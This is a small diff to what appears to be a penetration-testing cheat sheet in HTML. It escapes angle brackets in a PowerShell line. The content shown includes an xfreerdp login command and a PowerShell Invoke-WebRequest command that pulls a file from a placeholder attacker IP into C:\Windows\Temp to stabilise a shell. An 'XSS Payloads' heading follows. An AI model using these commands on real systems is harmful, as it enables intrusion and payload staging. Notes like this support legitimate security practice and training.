@@ -17,7 +17,7 @@ There is a :
   <p>xfreerdp /v:10.10.38.213 /u:User /p:Password +clipboard
 	
 <h3>To get stable shell from unstable from PowerShell</h3>
-  powershell -c "Invoke-WebRequest -Uri 'http://<IP>:<PORT>/<filename>' -OutFile 'C:\Windows\Temp\<filename>'"
+  powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"
 
 <h2 id='n2'><em>Payloads</em></h2>
     <h3>XSS Payloads</h3>
